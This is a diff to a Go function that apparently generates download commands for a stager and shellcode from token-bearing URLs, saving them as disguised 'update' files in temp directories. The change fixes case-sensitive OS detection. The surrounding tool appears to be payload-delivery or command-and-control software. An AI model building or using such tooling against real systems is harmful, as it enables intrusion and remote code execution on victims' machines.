@@ -43,9 +43,14 @@ func GenerateCommands(opt CommandOptions) []CommandItem {
 	stager := withToken(opt.StagerURL, opt.AccessToken)
 	sc := withToken(opt.ShellcodeURL, opt.AccessToken)
 
+	// osType 必须先去空白/转小写：save/path 的默认值与下面的分支都依赖它。
+	// 原实现这里用 opt.OS == "windows" 做大小写敏感比较，而分支用 osType，
+	// 一旦记录里存的是 "Windows"，就会生成 Windows 命令却套用 /tmp 的路径。
+	osType := strings.ToLower(strings.TrimSpace(opt.OS))
+
 	save := opt.SaveFilename
 	if save == "" {
-		if opt.OS == "windows" {
+		if osType == "windows" {
 			save = "update.exe"
 		} else {
 			save = "update"
@@ -53,7 +58,7 @@ func GenerateCommands(opt CommandOptions) []CommandItem {
 	}
 	path := opt.DownloadPath
 	if path == "" {
-		if opt.OS == "windows" {
+		if osType == "windows" {
 			path = "C:\\Windows\\Temp"
 		} else {
 			path = "/tmp"
@@ -65,7 +70,6 @@ func GenerateCommands(opt CommandOptions) []CommandItem {
 	}
 
 	var items []CommandItem
-	osType := strings.ToLower(opt.OS)
 
 	if osType == "windows" {
 		// full payload
